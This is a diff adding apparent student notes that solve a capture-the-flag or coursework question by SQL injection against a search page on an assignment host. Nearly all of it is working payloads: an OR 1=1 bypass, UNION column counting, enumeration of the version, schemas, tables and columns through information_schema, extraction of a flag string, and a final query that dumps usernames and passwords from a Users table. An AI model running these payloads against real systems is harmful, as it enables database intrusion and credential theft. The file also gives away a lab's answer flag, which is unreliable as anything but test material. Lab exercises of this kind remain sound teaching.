@@ -1,0 +1,39 @@
+code for Q2
+step 1:
+ball'+OR+1=1--+ 
+full link:
+http://assignment-dusty-rose.unimelb.life/search.php?search=%27+OR+1=1--+ 
+
+step 2:
+'UNION+SELECT+NULL+--+
+'UNION+SELECT+NULL,NULL+--+
+'UNION+SELECT+NULL,NULL,NULL+--+
+'UNION+SELECT+NULL,NULL,NULL,NULL+--+
+'UNION+SELECT+'a','b','c','d'+--+
+
+step 3:
+
+'UNION+SELECT+'a',@@version,'c','d'+--+ 
+
+//find the database name
+'UNION+SELECT+'a','b',schema_name,'d'+FROM+information_schema.schemata--+ 
+
+//find the table name
+'UNION+SELECT+'a','b',table_name,'d'+FROM+information_schema.tables+WHERE+table_schema='Secure'--+ 
+
+
+//find column name
+'UNION+SELECT+'a','b',column_name,'d'+FROM+information_schema.columns+WHERE+table_name='Flag'--+
+
+//find Flag2
+'UNION+SELECT+'a','b',string,'d'+FROM+Flag--+ 
+//flag2
+FLAG{Turning_them_tables_with_a_squiggle!@#1teeHee}
+
+
+##########OTHER FINDING:
+step 4:
+//check user and password
+'UNION+SELECT+'a','b',column_name,'d'+FROM+information_schema.columns+WHERE+table_name='Users'--+
+'UNION+SELECT+Website,Username,Password,'d'+FROM+Users--+ 
+
